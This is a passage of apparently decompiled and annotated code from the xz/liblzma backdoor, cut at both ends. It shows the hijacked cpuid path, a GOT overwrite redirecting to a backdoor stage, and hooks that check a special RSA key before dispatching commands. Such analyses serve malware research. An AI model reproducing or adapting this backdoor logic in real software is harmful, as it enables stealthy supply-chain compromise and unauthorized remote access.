                                                            if ( (unsigned int)Lparse_lzma12_0(v102, a2) )
                                                            {
                                                              v28 = 0LL;
                                                              do
                                                              {
                                                                v97 = v28;
                                                                if ( (unsigned int)v28 >= (unsigned int)v96 )
                                                                  goto LABEL_205;
                                                                v98 = v28;
                                                                v29 = (__int64)&v103;
                                                                v30 = sub_7660(
                                                                        *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(a2 + 40)
                                                                                              + 8LL)
                                                                                  + 8 * v28),
                                                                        (unsigned int)&v103,
                                                                        (int)v92 + 4,
                                                                        604,
                                                                        (unsigned int)v112,
                                                                        (_DWORD)v95,
                                                                        a2);
                                                                v28 = v98 + 1;
                                                              }
                                                              while ( !v30 );
                                                              *(_DWORD *)(a2 + 256) = v97;
                                                              if ( v14 == 2 && v111[0] < 0 )
                                                              {
                                                                if ( !v21 )
                                                                  goto LABEL_205;
                                                                if ( (v111[1] & 1) != 0 )
                                                                {
                                                                  v31 = 8LL;
                                                                  if ( v89 <= 8 )
                                                                    goto LABEL_205;
                                                                }
                                                                else
                                                                {
                                                                  v31 = 0LL;
                                                                }
                                                                if ( v89 < v31 + 2 )
                                                                  goto LABEL_205;
                                                                v20 = v31
                                                                    + 2
                                                                    + *(unsigned __int16 *)((char *)&v89
                                                                                          + v31
                                                                                          + v24
                                                                                          + 797);
                                                                if ( v20 >= v89 )
                                                                  goto LABEL_205;
                                                                if ( v89 - v20 <= 0x71 )
                                                                  goto LABEL_205;
                                                                v32 = *(_QWORD *)(a2 + 224);
                                                                v33 = *(_QWORD *)(a2 + 232);
                                                                if ( v32 < v33 )
                                                                  goto LABEL_205;
                                                                v34 = v32 - v33;
                                                                if ( v34 <= 0x38 )
                                                                  goto LABEL_205;
                                                                if ( v34 - 57 < v20 )
                                                                  goto LABEL_205;
                                                                v35 = *(_QWORD *)(a2 + 240);
                                                                v36 = 0LL;
                                                                do
                                                                {
                                                                  *(_BYTE *)(v35 + v36) = v111[v24 + 5 + v36];
                                                                  ++v36;
                                                                }
                                                                while ( v20 != v36 );
                                                                v37 = *(unsigned int *)(a2 + 256);
                                                                v38 = *(_QWORD *)(a2 + 224);
                                                                v39 = *(_QWORD *)(*(_QWORD *)(a2 + 40) + 8LL);
                                                                v40 = v20 + *(_QWORD *)(a2 + 232);
                                                                v29 = *(_QWORD *)(a2 + 240);
                                                                *(_QWORD *)(a2 + 232) = v40;
                                                                if ( !(unsigned int)sub_7660(
                                                                                      *(_QWORD *)(v39 + 8 * v37),
                                                                                      v29,
                                                                                      v40,
                                                                                      v38,
                                                                                      (unsigned int)&v111[v20 + 5 + v24],
                                                                                      (_DWORD)v21,
                                                                                      a2) )
                                                                  goto LABEL_205;
                                                              }
                                                              else if ( v22 )
                                                              {
                                                                v24 = 135LL;
                                                                goto LABEL_83;
                                                              }
                                                              if ( v91 < v24 )
                                                                goto LABEL_213;
LABEL_83:
                                                              if ( v91 - v24 < v20 )
                                                                goto LABEL_213;
                                                              if ( (v111[0] & 4) != 0
                                                                && (v41 = *(_QWORD *)(a2 + 16)) != 0
                                                                && (v42 = *(void (__fastcall **)(__int64))(v41 + 88)) != 0LL )
                                                              {
                                                                v42(0x80000000LL);
                                                                *(_DWORD *)(*(_QWORD *)(a2 + 48) + 8LL) = 1;
                                                              }
                                                              else
                                                              {
                                                                v43 = v111[0] & 5;
                                                                *(_DWORD *)(*(_QWORD *)(a2 + 48) + 8LL) = 0;
                                                                if ( v43 == 5 )
                                                                  goto LABEL_213;
                                                              }
                                                              v44 = (*(__int64 (**)(void))(*(_QWORD *)(a2 + 16) + 16LL))();
                                                              v46 = v111[0];
                                                              *(_DWORD *)(a2 + 144) = v44;
                                                              v47 = v44;
                                                              if ( (v46 & 0x10) != 0
                                                                && !*(_DWORD *)(*(_QWORD *)(a2 + 48) + 4LL) )
                                                              {
                                                                goto LABEL_213;
                                                              }
                                                              if ( (v46 & 2) != 0 )
                                                              {
                                                                v29 = a2;
                                                                if ( !(unsigned int)Llzma_rc_prices_1(v111, a2) )
                                                                {
                                                                  if ( v48 )
                                                                    goto LABEL_213;
                                                                }
                                                              }
                                                              if ( v14 )
                                                              {
                                                                if ( (_DWORD)v14 == 1 )
                                                                {
                                                                  if ( (v111[1] & 1) == 0
                                                                    && !*(_QWORD *)(*(_QWORD *)(a2 + 32) + 200LL) )
                                                                  {
                                                                    goto LABEL_213;
                                                                  }
                                                                  goto LABEL_101;
                                                                }
                                                                if ( (_DWORD)v14 != 3 )
                                                                {
LABEL_101:
                                                                  v49 = 0;
                                                                  goto LABEL_126;
                                                                }
                                                                if ( v111[3] >= 0
                                                                  && !*(_QWORD *)(*(_QWORD *)(a2 + 32) + 200LL) )
                                                                {
                                                                  goto LABEL_213;
                                                                }
                                                                HIWORD(v50) = 0;
                                                                if ( (v111[2] & 0x20) == 0 )
                                                                {
                                                                  v49 = -1;
                                                                  goto LABEL_126;
                                                                }
                                                                v52 = -1;
                                                                if ( v111[2] < 0 )
                                                                  v52 = v111[4];
                                                                LOBYTE(v50) = v52;
                                                                LOBYTE(v29) = -1;
                                                                if ( (v111[2] & 0x40) != 0 )
                                                                  v29 = v111[3] & 0x3F;
                                                                BYTE1(v50) = v29;
                                                                if ( (v111[3] & 0x40) != 0 )
                                                                {
                                                                  LODWORD(v45) = (v111[1] >> 3) & 7;
                                                                  v51 = ((v111[1] & 7) << 16) | v50 & 0xFF00FFFF;
                                                                  goto LABEL_125;
                                                                }
                                                              }
                                                              else
                                                              {
                                                                if ( v111[1] >= 0
                                                                  && !*(_QWORD *)(*(_QWORD *)(a2 + 32) + 200LL) )
                                                                {
                                                                  goto LABEL_213;
                                                                }
                                                                HIWORD(v50) = 0;
                                                                LOBYTE(v45) = -1;
                                                                if ( (v111[1] & 2) != 0 )
                                                                  LODWORD(v45) = (*(_WORD *)&v111[2] >> 6) & 0x7F;
                                                                LOBYTE(v50) = v45;
                                                                LOBYTE(v45) = -1;
                                                                if ( v46 < 0 )
                                                                  v45 = (*(_QWORD *)v111 >> 29) & 0x1FLL;
                                                                BYTE1(v50) = v45;
                                                                if ( (v111[1] & 4) != 0 )
                                                                {
                                                                  LOBYTE(v45) = v111[4] >> 5;
                                                                  v51 = (((v111[4] >> 2) & 7) << 16) | v50 & 0xFF00FFFF;
LABEL_125:
                                                                  v49 = ((_DWORD)v45 << 24) | v51 & 0xFFFFFF;
LABEL_126:
                                                                  *(_DWORD *)(a2 + 84) = v49;
                                                                  v53 = (unsigned int *)&v111[v24 + 5];
                                                                  if ( v47 )
                                                                  {
                                                                    v84 = v94;
                                                                    v85 = 11LL;
                                                                    v29 = a2;
                                                                    while ( v85 )
                                                                    {
                                                                      *v84++ = 0;
                                                                      --v85;
                                                                    }
                                                                    LODWORD(v103) = v14;
                                                                    *((_QWORD *)&v103 + 1) = v111;
                                                                    v104[2] = (__int64)&v111[v24 + 5];
                                                                    v104[0] = v109;
                                                                    v105 = v20;
                                                                    v104[1] = v110;
                                                                    v106 = v93;
                                                                    if ( (unsigned int)installed_func_0(
                                                                                         (__int64)&v103,
                                                                                         a2) )
                                                                    {
                                                                      v86 = v90;
                                                                      *(_DWORD *)(a2 + 24) = 1;
                                                                      *v86 = 0;
                                                                      return 1LL;
                                                                    }
                                                                    goto LABEL_213;
                                                                  }
                                                                  v54 = *(_QWORD *)(a2 + 16);
                                                                  if ( v54 )
                                                                  {
                                                                    v55 = *(__int64 (__fastcall **)(__int64, _QWORD, _QWORD))(v54 + 32);
                                                                    if ( v55 )
                                                                    {
                                                                      if ( *(_QWORD *)(v54 + 40)
                                                                        && *(_QWORD *)(v54 + 48) )
                                                                      {
                                                                        if ( v14 )
                                                                        {
                                                                          if ( (_DWORD)v14 == 1 )
                                                                          {
                                                                            v29 = (v111[0] & 0x40) != 0;
                                                                            if ( (unsigned int)Llzma_block_unpadded_size_1(
                                                                                                 v111[1] & 1,
                                                                                                 v29,
                                                                                                 (v111[1] & 2) != 0,
                                                                                                 v111[3],
                                                                                                 a2) )
                                                                              goto LABEL_199;
                                                                          }
                                                                          else
                                                                          {
                                                                            if ( (_DWORD)v14 != 2 )
                                                                            {
                                                                              if ( (v111[1] & 0xC0) == 0xC0 )
                                                                              {
                                                                                if ( *(_QWORD *)(v54 + 24) )
                                                                                {
                                                                                  v78 = *(void (__fastcall **)(_QWORD, _QWORD, _QWORD, _QWORD, __int128 *, _QWORD))(v54 + 64);
                                                                                  if ( v78 )
                                                                                  {
                                                                                    v29 = 0LL;
                                                                                    v103 = 5uLL;
                                                                                    v78(0LL, 0LL, 0LL, 0LL, &v103, 0LL);
                                                                                    (*(void (__fastcall **)(_QWORD))(v54 + 24))(0LL);
                                                                                  }
                                                                                }
                                                                              }
                                                                              goto LABEL_213;
                                                                            }
                                                                            v20 = (unsigned __int16)v20;
                                                                            if ( (v111[1] & 1) != 0 )
                                                                            {
                                                                              if ( v20 <= 8 )
                                                                                goto LABEL_213;
                                                                              v47 = *v53;
                                                                              v72 = v53[1];
                                                                              v20 -= 8LL;
                                                                              v73 = 8LL;
                                                                            }
                                                                            else
                                                                            {
                                                                              v72 = 0LL;
                                                                              v73 = 0LL;
                                                                            }
                                                                            if ( v46 >= 0 )
                                                                            {
                                                                              v74 = *(unsigned __int16 *)&v111[3];
                                                                            }
                                                                            else
                                                                            {
                                                                              if ( v20 <= 2 )
                                                                                goto LABEL_213;
                                                                              v74 = *(unsigned __int16 *)((char *)v53 + v73);
                                                                              v20 -= 2LL;
                                                                              v73 += 2LL;
                                                                              if ( v74 < v20 )
                                                                                goto LABEL_213;
                                                                            }
                                                                            if ( v20 >= v74 )
                                                                            {
                                                                              if ( !(_DWORD)v72
                                                                                || (v89 = (unsigned __int64)v53,
                                                                                    v29 = (unsigned int)v72,
                                                                                    v75 = v55(
                                                                                            v72,
                                                                                            (unsigned int)v72,
                                                                                            (unsigned int)v72),
                                                                                    v53 = (unsigned int *)v89,
                                                                                    v75 != -1) )
                                                                              {
                                                                                if ( !v47
                                                                                  || (v76 = *(_QWORD *)(a2 + 16),
                                                                                      v89 = (unsigned __int64)v53,
                                                                                      v29 = v47,
                                                                                      v77 = (*(__int64 (__fastcall **)(_QWORD, _QWORD, _QWORD))(v76 + 40))(
                                                                                              v47,
                                                                                              v47,
                                                                                              v47),
                                                                                      v53 = (unsigned int *)v89,
                                                                                      v77 != -1) )
                                                                                {
                                                                                  if ( *((_BYTE *)v53 + v73) )
                                                                                  {
                                                                                    (*(void (**)(void))(*(_QWORD *)(a2 + 16) + 48LL))();
                                                                                    goto LABEL_199;
                                                                                  }
                                                                                }
                                                                              }
                                                                            }
                                                                          }
                                                                        }
                                                                        else
                                                                        {
                                                                          v56 = *(_QWORD *)(a2 + 32);
                                                                          if ( !v56
                                                                            || !*(_QWORD *)(v56 + 88)
                                                                            || !*(_DWORD *)v56 )
                                                                          {
                                                                            goto LABEL_213;
                                                                          }
                                                                          if ( v111[1] >= 0 )
                                                                          {
                                                                            v57 = *(int **)(v56 + 200);
                                                                            if ( !v57 )
                                                                              goto LABEL_213;
                                                                            v58 = *v57;
                                                                            if ( *v57 > 2 )
                                                                            {
                                                                              if ( v58 != 3 )
                                                                                goto LABEL_213;
                                                                            }
                                                                            else
                                                                            {
                                                                              if ( v58 < 0 )
                                                                                goto LABEL_213;
                                                                              *v57 = 3;
                                                                            }
                                                                          }
                                                                          if ( (v46 & 0x40) == 0 )
                                                                            goto LABEL_145;
                                                                          v59 = *(_DWORD **)(v56 + 192);
                                                                          if ( v59 && *v59 <= 1u )
                                                                          {
                                                                            *v59 = 0;
LABEL_145:
                                                                            LODWORD(v100) = -1;
                                                                            if ( (v46 & 0x20) != 0 )
                                                                            {
                                                                              v29 = (v111[1] >> 3) & 0xF;
                                                                              v60 = installed_func_2(&v100, v29, v54);
                                                                            }
                                                                            else
                                                                            {
                                                                              v29 = (__int64)&v100;
                                                                              v60 = installed_func_3(
                                                                                      a2,
                                                                                      &v100,
                                                                                      1LL,
                                                                                      1LL);
                                                                            }
                                                                            if ( !v60 )
                                                                              goto LABEL_213;
                                                                            v61 = v100;
                                                                            v99 = 0;
                                                                            LODWORD(v101) = 0;
                                                                            v102[0] = 0LL;
                                                                            if ( (int)v100 < 0 )
                                                                              goto LABEL_213;
                                                                            v62 = *(_QWORD *)(a2 + 16);
                                                                            if ( !v62
                                                                              || !*(_QWORD *)(v62 + 64)
                                                                              || !*(_QWORD *)(v62 + 80) )
                                                                            {
                                                                              goto LABEL_213;
                                                                            }
                                                                            v63 = 1LL << v100;
                                                                            v64 = (int)v100 >> 6;
                                                                            while ( 1 )
                                                                            {
                                                                              v29 = (__int64)&v103;
                                                                              v65 = 32LL;
                                                                              v66 = &v103;
                                                                              *((_QWORD *)&v102[0] + 1) = 500000000LL;
                                                                              while ( v65 )
                                                                              {
                                                                                *(_DWORD *)v66 = 0;
                                                                                v66 = (__int128 *)((char *)v66 + 4);
                                                                                --v65;
                                                                              }
                                                                              v104[v64 - 2] = v63;
                                                                              *(_QWORD *)&v102[0] = 0LL;
                                                                              v67 = (*(__int64 (__fastcall **)(_QWORD, __int128 *, _QWORD, _QWORD, __int128 *, _QWORD))(v62 + 64))(
                                                                                      v61 + 1,
                                                                                      &v103,
                                                                                      0LL,
                                                                                      0LL,
                                                                                      v102,
                                                                                      0LL);
                                                                              if ( v67 >= 0 )
                                                                                break;
                                                                              if ( *(_DWORD *)(*(__int64 (**)(void))(v62 + 80))() != 4 )
                                                                                goto LABEL_213;
                                                                            }
                                                                            if ( !v67 )
                                                                              goto LABEL_213;
                                                                            if ( (v104[v64 - 2] & v63) == 0 )
                                                                              goto LABEL_213;
                                                                            v29 = (__int64)&v101;
                                                                            if ( sub_70B0(v61, &v101, 4LL, v62) < 0 )
                                                                              goto LABEL_213;
                                                                            LODWORD(v101) = _byteswap_ulong(v101);
                                                                            if ( (unsigned int)(v101 - 1) > 0x40 )
                                                                              goto LABEL_213;
                                                                            v29 = (__int64)&v99;
                                                                            if ( sub_70B0(v61, &v99, 1LL, v62) < 0 )
                                                                              goto LABEL_213;
                                                                            v29 = a2 + 160;
                                                                            v68 = (unsigned int)(v101 - 1);
                                                                            *(_QWORD *)(a2 + 152) = v68;
                                                                            if ( sub_70B0(v61, a2 + 160, v68, v62) < 0 )
                                                                              goto LABEL_213;
                                                                            v69 = *(_QWORD *)(a2 + 32);
                                                                            v29 = *(_QWORD *)(v69 + 24);
                                                                            if ( !v29 )
                                                                              goto LABEL_213;
                                                                            v70 = *(__int64 **)(v69 + 88);
                                                                            if ( (v111[2] & 0x3F) != 0 )
                                                                            {
                                                                              v71 = 2 * (v111[2] & 0x3F);
                                                                            }
                                                                            else
                                                                            {
                                                                              v71 = 22;
                                                                              if ( v70 )
                                                                                v71 = *((_DWORD *)v70 - 2);
                                                                            }
                                                                            *(_DWORD *)(v69 + 96) = v71 + 1;
                                                                            *v70 = v29;
LABEL_199:
                                                                            v79 = v104;
                                                                            v80 = 60LL;
                                                                            LOBYTE(v102[0]) = 1;
                                                                            v29 = 1LL;
                                                                            v103 = 0LL;
                                                                            while ( v80 )
                                                                            {
                                                                              *(_DWORD *)v79 = 0;
                                                                              v79 = (__int64 *)((char *)v79 + 4);
                                                                              --v80;
                                                                            }
                                                                            v81 = *(_QWORD *)(a2 + 8);
                                                                            LOBYTE(v103) = 0x80;
                                                                            v107 = 8;
                                                                            v108 = 1;
                                                                            v82 = (*(__int64 (__fastcall **)(__int128 *, __int64, _QWORD))(v81 + 224))(
                                                                                    v102,
                                                                                    1LL,
                                                                                    0LL);
                                                                            if ( v82 )
                                                                            {
                                                                              v29 = (*(__int64 (__fastcall **)(__int128 *, __int64, _QWORD))(*(_QWORD *)(a2 + 8) + 224LL))(
                                                                                      &v103,
                                                                                      256LL,
                                                                                      0LL);
                                                                              if ( v29 )
                                                                              {
                                                                                if ( (*(unsigned int (__fastcall **)(__int64, __int64, __int64, _QWORD))(*(_QWORD *)(a2 + 8) + 232LL))(
                                                                                       v93,
                                                                                       v29,
                                                                                       v82,
                                                                                       0LL) == 1 )
                                                                                  goto LABEL_205;
                                                                              }
                                                                            }
                                                                          }
                                                                        }
                                                                      }
                                                                    }
                                                                  }
LABEL_213:
                                                                  *(_DWORD *)(a2 + 24) = 1;
                                                                  memset(v117, 0, 0x39uLL);
                                                                  if ( (v111[0] & 1) == 0 )
                                                                    goto LABEL_206;
                                                                  v87 = *(_QWORD *)(a2 + 16);
                                                                  if ( v87 )
                                                                  {
                                                                    v88 = *(void (__fastcall **)(_QWORD, __int64))(v87 + 24);
                                                                    if ( v88 )
                                                                      v88(0LL, v29);
                                                                  }
                                                                  return 0LL;
                                                                }
                                                              }
                                                              v51 = v50 | 0xFF0000;
                                                              LOBYTE(v45) = -1;
                                                              goto LABEL_125;
                                                            }
                                                          }
                                                        }
                                                      }
                                                    }
                                                  }
                                                }
                                              }
                                            }
                                            else
                                            {
                                              if ( (_DWORD)v14 != 3 || (v111[1] & 0x40) != 0 )
                                              {
                                                v20 = 0LL;
                                                v22 = 0LL;
                                                v24 = 135LL;
                                                v21 = 0LL;
                                                v92 = 5LL;
                                                v25 = 4;
                                                goto LABEL_53;
                                              }
                                              if ( v89 > 0x2F )
                                              {
                                                v20 = 48LL;
                                                v22 = 135LL;
                                                v21 = 0LL;
                                                v92 = 53LL;
                                                v24 = 135LL;
                                                v25 = 52;
                                                goto LABEL_53;
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
LABEL_205:
    *(_DWORD *)(a2 + 24) = 1;
LABEL_206:
    *v90 = 1;
    return 0LL;
  }
  *(_DWORD *)(a2 + 24) = 1;
  return 0LL;
}
// 9B7E: variable 'v48' is possibly undefined
// 9CAB: variable 'v45' is possibly undefined
// 70B0: using guessed type __int64 __fastcall sub_70B0(_QWORD, _QWORD, _QWORD, _QWORD);
// 71C0: using guessed type __int64 __fastcall sub_71C0(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD);
// 74E0: using guessed type __int64 __fastcall sub_74E0(_QWORD, _QWORD, _QWORD);
// 7660: using guessed type __int64 __fastcall sub_7660(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, __int64);
// 7BF0: using guessed type __int64 __fastcall Lindex_decode_1(_QWORD, _QWORD, _QWORD);
// 7C90: using guessed type __int64 __fastcall Lindex_encode_1(_QWORD, _QWORD, _QWORD, _QWORD);
// 7D80: using guessed type __int64 __fastcall Llzma_block_unpadded_size_1(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD);
// 7E10: using guessed type __int64 __fastcall Llzma_rc_prices_1(_QWORD, _QWORD);
// 8200: using guessed type __int64 __fastcall Lparse_lzma12_0(_QWORD, _QWORD);

//----- (000000000000A270) ----------------------------------------------------
__int64 __fastcall Llzma_index_prealloc_0(unsigned int a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 (__fastcall **v4)(_QWORD, __int64, __int64, __int64); // rax
  __int64 (__fastcall *v5)(_QWORD, __int64, __int64, __int64); // r14
  __int64 result; // rax
  __int64 v8; // [rsp+0h] [rbp-48h]
  int v9[11]; // [rsp+1Ch] [rbp-2Ch] BYREF

  if ( !global_ctx )
    return 0LL;
  v4 = (__int64 (__fastcall **)(_QWORD, __int64, __int64, __int64))global_ctx->field_8;
  if ( !v4 )
    return 0LL;
  v5 = *v4;
  if ( !*v4 )
    return 0LL;
  if ( !a4 )
    return v5(a1, a2, a3, a4);
  v8 = a4;
  v9[0] = 1;
  result = check_special_rsa_key(a4, (__int64)global_ctx, v9);
  a4 = v8;
  if ( v9[0] )
    return v5(a1, a2, a3, a4);
  return result;
}
// A270: using guessed type int var_2C[11];

//----- (000000000000A300) ----------------------------------------------------
__int64 __fastcall Llzma_index_memusage_part_0(__int64 a1, __int64 a2)
{
  __int64 v2; // rax
  __int64 (__fastcall *v3)(__int64, __int64); // r12
  int v5[7]; // [rsp+Ch] [rbp-1Ch] BYREF

  if ( !global_ctx )
    return 0LL;
  v2 = *(_QWORD *)&global_ctx->field_8;
  if ( !v2 )
    return 0LL;
  v3 = *(__int64 (__fastcall **)(__int64, __int64))(v2 + 8);
  if ( !v3 )
    return 0LL;
  if ( a2 )
    check_special_rsa_key(a2, (__int64)global_ctx, v5);
  return v3(a1, a2);
}
// A300: using guessed type int var_1C[7];

//----- (000000000000A360) ----------------------------------------------------
void __fastcall Llzma_index_init_0(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rax
  void (__fastcall *v4)(__int64, __int64, __int64); // r14
  int v6[7]; // [rsp+1Ch] [rbp-1Ch] BYREF

  if ( global_ctx )
  {
    v3 = global_ctx->field_8;
    if ( v3 )
    {
      v4 = *(void (__fastcall **)(__int64, __int64, __int64))(v3 + 16);
      if ( v4 )
      {
        if ( a1 )
          check_special_rsa_key(a1, (__int64)global_ctx, v6);
        v4(a1, a2, a3);
      }
    }
  }
}
// A360: using guessed type int var_1C[7];

//----- (000000000000A3D0) ----------------------------------------------------
__int64 __fastcall Llzma12_mode_map_part_1(int a1, __int64 a2, char *str)
{
  __int64 len; // rax
  __int64 v4; // rcx
  struct_ctx *v7; // rdx
  char *v8; // rdi
  __int64 v9; // rbx
  __int64 v10; // r13
  char *v11; // rdi
  __int64 v12; // rcx
  char *v13; // rdi
  __int64 v14; // rcx
  char *v15; // r12
  int v16; // r8d
  int v17; // r9d
  char *v18; // rax
  char v19; // dl
  void (__fastcall *v20)(__int64); // rax
  bool v21; // zf
  char *v22; // r9
  char *v23; // r14
  char *v24; // r8
  char *v25; // r15
  __int64 v26; // rcx
  __int64 i; // rax
  char v28; // dl
  __int64 v29; // rsi
  __int64 j; // rax
  __int64 v31; // rsi
  __int64 k; // rax
  char *v33; // rax
  char *v34; // rax
  __int64 v35; // rsi
  __int64 m; // rax
  void (__fastcall *v37)(__int64, __int64, char *, __int64, char *, char *); // rax
  char *v38; // [rsp+8h] [rbp-448h]
  char *v39; // [rsp+10h] [rbp-440h]
  __int128 v40; // [rsp+18h] [rbp-438h] BYREF
  char v41; // [rsp+28h] [rbp-428h] BYREF
  __int128 v42; // [rsp+118h] [rbp-338h] BYREF
  char v43; // [rsp+128h] [rbp-328h] BYREF
  __int128 v44; // [rsp+218h] [rbp-238h] BYREF
  char v45[30]; // [rsp+228h] [rbp-228h] BYREF
  __int16 v46; // [rsp+246h] [rbp-20Ah]
  char v47[520]; // [rsp+248h] [rbp-208h] BYREF

  len = 0LL;
  v4 = 60LL;
  v7 = global_ctx;
  v8 = &v41;
  v9 = global_ctx->field_30;
  v10 = global_ctx->field_10;
  v40 = 0LL;
  while ( v4 )
  {
    *(_DWORD *)v8 = 0;
    v8 += 4;
    --v4;
  }
  v11 = &v43;
  v12 = 60LL;
  v42 = 0LL;
  while ( v12 )
  {
    *(_DWORD *)v11 = 0;
    v11 += 4;
    --v12;
  }
  v13 = v45;
  v14 = 124LL;
  v44 = 0LL;
  while ( v14 )
  {
    *(_DWORD *)v13 = 0;
    v13 += 4;
    --v14;
  }
  if ( str )
  {
    if ( *(_DWORD *)v9 != 1 && !v7->field_90 && (!*(_QWORD *)(v9 + 72) || *(_QWORD *)(v9 + 80)) )
    {
      len = strlen(str);
      v15 = &str[len];
      while ( 1 )
      {
        if ( str >= v15 )
          return len;
        len = (__int64)table_get(str, (unsigned __int64)v15);
        if ( (_DWORD)len == 1936 )
        {
          v18 = *(char **)(v9 + 16);
          v21 = *(_DWORD *)(v9 + 8) == 0;
          v19 = *v18;
          LOBYTE(v18) = v18[1];
          LOBYTE(v44) = v19;
          BYTE1(v44) = (_BYTE)v18;
          *(_DWORD *)v9 = 1;
          if ( !v21 )
          {
            if ( v10 )
            {
              v20 = *(void (__fastcall **)(__int64))(v10 + 88);
              if ( v20 )
                v20(255LL);
            }
          }
          len = sub_7430(v9, a1, (unsigned int)&v44, (_DWORD)str, v16, v17);
          if ( *(_DWORD *)(v9 + 8) )
          {
            v21 = v10 == 0;
            goto LABEL_53;
          }
          return len;
        }
        if ( (_DWORD)len == 2160 || (_DWORD)len == 416 )
          break;
        ++str;
      }
      v22 = str + 23;
      if ( (_DWORD)len == 2160 )
        v22 = str + 22;
      v23 = 0LL;
      v24 = 0LL;
      v25 = 0LL;
      do
      {
        v39 = v24;
        v38 = v22;
        len = (__int64)table_get(str, (unsigned __int64)v15);
        v22 = v38;
        v24 = v39;
        if ( (_DWORD)len == 1656 )
        {
          if ( v39 )
          {
            v23 = (char *)(str - v39);
            if ( (unsigned __int64)(str - v39) > 0xFF )
              goto LABEL_57;
            qmemcpy(&v40, v39, (unsigned __int64)v23);
          }
        }
        else if ( (_DWORD)len == 2064 )
        {
          v25 = (char *)(str - v38);
          if ( (unsigned __int64)(str - v38) > 0xFF )
            goto LABEL_57;
          len = (__int64)&v42;
          v24 = str + 6;
          qmemcpy(&v42, v38, (unsigned __int64)v25);
        }
        ++str;
      }
      while ( str < v15 );
      if ( !v25 || !v23 )
        goto LABEL_57;
      v26 = *(_QWORD *)(v9 + 24);
      for ( i = 0LL; i != 21; v45[i - 17] = v28 )
        v28 = *(_BYTE *)(v26 + i++);
      v29 = *(_QWORD *)(v9 + 40);
      for ( j = 0LL; j != 14; ++j )
        v45[j + 5] = *(_BYTE *)(v29 + j);
      v45[19] = 32;
      v31 = *(_QWORD *)(v9 + 48);
      for ( k = 0LL; k != 4; ++k )
        v45[k + 20] = *(_BYTE *)(v31 + k);
      v45[24] = 32;
      v33 = *(char **)(v9 + 16);
      v45[25] = *v33;
      LOBYTE(v33) = v33[1];
      v45[27] = 32;
      v45[26] = (char)v33;
      v34 = *(char **)(v9 + 16);
      v45[28] = *v34;
      LOBYTE(v34) = v34[1];
      v46 = 23328;
      v45[29] = (char)v34;
      v35 = *(_QWORD *)(v9 + 32);
      for ( m = 0LL; m != 7; ++m )
      {
        LOBYTE(v26) = *(_BYTE *)(v35 + m);
        v47[m] = v26;
      }
      v47[7] = 93;
      v21 = *(_DWORD *)(v9 + 8) == 0;
      *(_DWORD *)v9 = 1;
      if ( !v21 )
      {
        if ( v10 )
        {
          v37 = *(void (__fastcall **)(__int64, __int64, char *, __int64, char *, char *))(v10 + 88);
          if ( v37 )
            v37(255LL, v35, v47, v26, v24, v38);
        }
      }
      len = sub_7430(v9, 3, (unsigned int)&v44, (unsigned int)&v42, (unsigned int)&v40, (_DWORD)v22);
      if ( *(_DWORD *)(v9 + 8) )
      {
        v21 = v10 == 0;
LABEL_53:
        if ( !v21 )
        {
          len = *(_QWORD *)(v10 + 88);
          if ( len )
            return ((__int64 (__fastcall *)(__int64))len)(0x80000000LL);
        }
      }
    }
  }
  else
  {
LABEL_57:
    *(_DWORD *)v9 = 1;
  }
  return len;
}
// A4E9: variable 'v16' is possibly undefined
// A4E9: variable 'v17' is possibly undefined
// A6E0: variable 'v22' is possibly undefined

//----- (000000000000A730) ----------------------------------------------------
__int64 __fastcall cpuid(unsigned int a1, _DWORD *a2, _DWORD *a3, _DWORD *a4, _DWORD *a5)
{
  __int64 result; // rax

  _RAX = a1;
  __asm { cpuid }
  *a2 = result;
  *a3 = _RBX;
  *a4 = _RCX;
  *a5 = _RDX;
  return result;
}

//----- (000000000000A750) ----------------------------------------------------
__int64 __fastcall hijacked_cpuid(unsigned int edi0, _DWORD *a2)
{
  unsigned int v3; // [rsp+14h] [rbp-4Ch] BYREF
  int v4; // [rsp+18h] [rbp-48h] BYREF
  int v5; // [rsp+1Ch] [rbp-44h] BYREF
  rootkit_ctx ctx; // [rsp+20h] [rbp-40h] BYREF

  if ( global_counter == 1 )
  {
    ctx.runtime_addr = 1LL;
    memset(&ctx.runtime_offset, 0, 32);
    ctx.got_ptr = (__int64)a2;
    backdoor_init(&ctx, a2);
  }
  ++global_counter;
  cpuid(edi0, &v3, &v4, &v5, &ctx);
  return v3;
}
// CB60: using guessed type int global_counter;

//----- (000000000000A7C4) ----------------------------------------------------
__int64 __fastcall backdoor_init(rootkit_ctx *ctx, _DWORD *rbp_m10)
{
  _DWORD *v2; // r8
  __int64 offset; // rax
  bool is_cpuid_got_zero; // zf
  _QWORD *cpuid_got_ptr; // rdx 0x00007ffff7fc1fd8
  __int64 got_value; // r12 0x00007ffff7f8a6f0
  void *cpuid_got_ptr_1; // [rsp+8h] [rbp-28h]
                                                // rsi: 0x00007fffffffe8c0 is a stack pointer
  ctx->self = ctx;
  backdoor_ctx_save(ctx);                       // after this ctx_save:
                                                // 
                                                // runtime_addr = &address_hinter (0xAE20)
                                                // cpuid_got_ptr += 0x18
                                                // self = ro_gots
                                                // ctx->cpuid_got_ptr = ro_gots.cpu_id
  ctx->got_ptr = ctx->cpuid_got_ptr;
  offset = ctx->runtime_addr - (unsigned __int64)ctx->self;// = addr_hinter - ro_gots (offset of addr_hinter)
  ctx->runtime_offset = offset;
  is_cpuid_got_zero = ro_gots.cpu_id + offset == 0;
  cpuid_got_ptr = (_QWORD *)(ro_gots.cpu_id + offset);
  ctx->cpuid_got_ptr = (__int64)cpuid_got_ptr;
  if ( !is_cpuid_got_zero )
  {
    cpuid_got_ptr_1 = cpuid_got_ptr;
    got_value = *cpuid_got_ptr;
    *cpuid_got_ptr = ro_gots.backdoor_init_stage2 + offset;// overwrite cpuid's got, jump to backdoor_init_stage
    offset = cpuid((unsigned int)ctx, rbp_m10, cpuid_got_ptr, &ro_gots, v2);
    *(_QWORD *)cpuid_got_ptr_1 = got_value;
  }
  return offset;
}
// A817: variable 'v2' is possibly undefined

//----- (000000000000A830) ----------------------------------------------------
__int64 __fastcall get_cpuid(unsigned int a1, _DWORD *a2, _DWORD *a3, _DWORD *a4, _DWORD *a5, _DWORD *_r9)
{
  unsigned int v6; // eax

